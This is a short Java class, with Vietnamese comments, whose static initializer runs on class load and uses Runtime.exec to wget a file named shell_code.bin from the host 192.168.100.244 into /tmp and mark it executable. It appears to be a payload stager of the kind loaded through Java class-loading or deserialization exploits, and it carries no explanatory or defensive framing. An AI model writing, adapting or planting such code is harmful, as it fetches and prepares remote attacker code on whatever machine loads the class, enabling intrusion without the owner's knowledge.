import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.Runtime;

public class code {
    static {
        try {
            String cmd = "wget -O /tmp/shell_code.bin http://192.168.100.244/shell_code.bin";
            Process p1 = Runtime.getRuntime().exec(cmd);
            p1.waitFor(); // Chờ tải file xong
            InputStream in = p1.getInputStream();
            InputStreamReader i = new InputStreamReader(in, "GBK");

            String cmd2 = "chmod +x /tmp/shell_code.bin";
            Process p2 = Runtime.getRuntime().exec(cmd2);
            p2.waitFor(); // Chờ chmod xong
            in = p2.getInputStream();
            i = new InputStreamReader(in, "GBK");

        } catch (Exception e) {
            e.printStackTrace(); // In lỗi ra nếu có
        }
    }

    public static void main(String[] args) {
    }
}
